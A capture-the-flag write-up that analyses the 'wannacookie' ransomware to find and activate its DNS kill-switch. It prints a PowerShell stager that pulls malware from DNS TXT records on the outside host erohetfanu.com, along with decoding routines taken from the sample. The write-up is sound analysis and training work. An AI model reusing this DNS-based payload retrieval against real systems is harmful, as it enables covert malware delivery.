Question 11: Stop the Malware
=============================

| Analyze the full malware source code to find a kill-switch and activate it at the North Pole's domain registrar `HoHoHo Daddy <https://hohohodaddy.kringlecastle.com/index.html>`_.
| What is the full sentence text that appears on the domain registration success message (bottom sentence)?

Answer: *Successfully registered yippeekiyaa.aaay!*

Solution
--------

Step 1: Safely obtain the malware
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

We started with the ``WannacookieLoader.ps1`` code from :doc:`Question 10 </objectives/question10>`. 

We modified the ``WannacookieLoader.ps1`` code as shown below. Line 10 saves the output, which is the malware, to a file (**wannacookie.min.ps1**) instead of executing it. 

.. code-block:: powershell
 :linenos:
 :emphasize-lines: 10

 function H2A($a) {
    $o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}
    return $o
  }
  $f = "77616E6E61636F6F6B69652E6D696E2E707331"
  $h = ""
  foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
    $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings
  }
  $(H2A $h | Out-File 'E:\Temp\wannacookie.min.ps1')

We ran the above code to ensure that it worked but then utilised Alabaster's hint to download a non-minified version of the malware called **wannacookie.ps1**.

To download **wannacookie.ps1** we made the following changes to the above code:

* In line 5 we changed the HEX encoded string to represent ``wannacookie.ps1`` instead of ``wannacookie.min.ps1``
* In line 10 we changed the output file name to ``wannacookie.ps1``

The resulting code is shown below:

.. code-block:: powershell
 :linenos:
 :emphasize-lines: 5,10

 function H2A($a) {
    $o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}
    return $o
  }
  $f = "77616E6E61636F6F6B69652E707331"
  $h = ""
  foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
    $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings
  }
  $(H2A $h | Out-File 'E:\Temp\wannacookie.ps1')

.. note::

 The remaining part of this solution as well as the answer to :doc:`Question 12 </objectives/question12>` were based on **wannacookie.ps1** instead of **wannacookie.min.ps1**.

Step 2: Find the killswitch
^^^^^^^^^^^^^^^^^^^^^^^^^^^

The **wannacookie.ps1** code contained a function called **wannacookie**. Part of this function included the following code:

.. code-block:: powershell
 :linenos:
 :emphasize-lines: 2

 $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"
 if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return}

Line 2 exits out of the function without doing anything if a certain DNS resolution returns something rather than null. In other words, this line checks for the kill-switch that is referred to in this question.

To determine the DNS name we borrowed existing functions from **wannacookie.ps1** to create the following code:

.. code-block:: powershell
 :linenos:

 function H2B {
    param($HX)
    $HX = $HX -split '(..)' | ? { $_ }
    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
 }

 function G2B {
 param([byte[]]$Data)
	Process {
        $SrcData = New-Object System.IO.MemoryStream( , $Data )
	    $output = New-Object System.IO.MemoryStream
        $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress)
	    $gStream.CopyTo( $output )
        $gStream.Close()
		$SrcData.Close()
		[byte[]] $byteArr = $output.ToArray()
        return $byteArr
    }
 }

 function B2H {
    param($DEC)
    $tmp = ''
    ForEach ($value in $DEC){
        $a = "{0:x}" -f [Int]$value
        if ($a.length -eq 1){
            $tmp += '0' + $a
        } else {
            $tmp += $a
        }
    }
    return $tmp
 }

 function ti_rox {
    param($b1, $b2)
    $b1 = $(H2B $b1)
    $b2 = $(H2B $b2)
    $cont = New-Object Byte[] $b1.count
    if ($b1.count -eq $b2.count) {
        for($i=0; $i -lt $b1.count ; $i++)
        {
            $cont[$i] = $b1[$i] -bxor $b2[$i]
        }   
    }
    return $cont
 }

 function H2A() {
    Param($a)
    $outa
    $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_}
    return $outa
 }

 $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"
 $name = $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))

 Write-Host $name

The functions in lines 1 to 56 of the above code simply perform various mathematical translations. For example, H2A converts from HEX to ASCII.

Running this code returned ``yippeekiyaa.aaay``.

Step 3: Activate the kill-switch
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

We activated ``yippeekiyaa.aaay`` at the North Pole's domain registrar `HoHoHo Daddy <https://hohohodaddy.kringlecastle.com/index.html>`_.

The registrar returned **Successfully registered yippeekiyaa.aaay!**
